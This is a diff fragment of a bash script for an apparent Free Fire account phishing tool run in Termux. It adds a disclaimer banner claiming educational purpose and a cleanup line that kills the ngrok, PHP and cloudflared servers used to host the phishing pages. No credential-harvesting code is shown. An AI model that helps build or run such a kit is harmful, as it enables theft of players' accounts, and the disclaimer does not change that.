@@ -753,6 +753,13 @@ echo ""
 termux-open-url https://wwu.onlinehacking.in/free-fire-account-hack-phishing-tool-with-termux
 clear
 echo ""
+	printf "                           \e[91m|===========================|
+	                  [¤]   \e[1;33mD I S C L A I M E R${red}   \e[91m[¤]
+	                   \e[91m|===========================|\n\n"
+			   echo ""
+printf " \e[91m[!]  \e[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of FreeFire Phishing are not responsible for any kind hack and stuff.\n\n• FreeFire Phishing is a open source tool that help us to know how phishing works\n\n• Phishing is illigal if you are using as offensive\n\n• Developers assume NO liability and are NOT responsible for any damage caused by this program\n\n• software to test device, company or any other type of target without WRITTEN PERMISSION from them.\n\n"
+echo ""
+echo ""
 printf "\e[31m[\e[32m★\e[31m]\e[32m This Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
 echo ""
 echo ""
@@ -776,6 +783,7 @@ kill -9 $php
 kill -9 $ngrok
 kill -9 $cloudflared
 kill -9 $apache2
+killall -KILL ngrok php cloudflared &>/dev/null
 clear
 
 echo -e $'' 
